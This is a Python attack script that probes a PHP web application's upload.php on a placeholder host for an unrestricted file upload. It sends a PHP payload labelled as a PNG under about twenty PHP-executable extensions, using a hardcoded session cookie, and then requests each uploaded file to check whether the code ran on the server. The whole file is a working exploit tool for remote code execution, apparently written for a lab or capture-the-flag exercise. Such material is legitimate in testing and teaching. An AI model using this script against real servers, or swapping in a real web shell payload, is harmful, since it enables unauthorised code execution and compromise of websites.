#!/usr/bin/env python3
import requests

cookies = {
    'PHPSESSID': 'rd2vbqlnc24206q3fctgdvo1c9',
}

headers = {
    'Host': 'abc.xyz:8080',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'multipart/form-data; boundary=---------------------------17640704221211466590494357033',
    'Origin': 'http://abc.xyz:8080',
    'Connection': 'close',
    'Referer': 'http://abc.xyz:8080/index.php',
    'Upgrade-Insecure-Requests': '1',
}


extensions = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml", ".pgif", ".shtml", ".htaccess", ".phar", ".inc", ".hphp", ".ctp", ".module"]


for ext in extensions:
    data = f'-----------------------------17640704221211466590494357033\r\nContent-Disposition: form-data; name="image"; filename="test{ext}"\r\nContent-Type: image/png\r\n\r\n<?php phpinfo(); ?>\n\r\n-----------------------------17640704221211466590494357033--\r\n'

    response = requests.post('http://abc.xyz:8080/upload.php', cookies=cookies, headers=headers, data=data, verify=False)
    if "successful" in response.text:
        print(f"[+] Upload Successful with extension: {ext}")
        file_url = f"http://abc.xyz:8080/uploads/test{ext}"
        s = requests.get(url=file_url, cookies=cookies, verify=False)
        if s.status_code == 200 and "<?php phpinfo(); ?>" not in s.text: 
            print(f"[+] Code Execution also successful with extension: {ext}")
        else:
            print("[-] But Code execution failed!")
    else:
        print(f"[-] Upload failed with extension: {ext}")
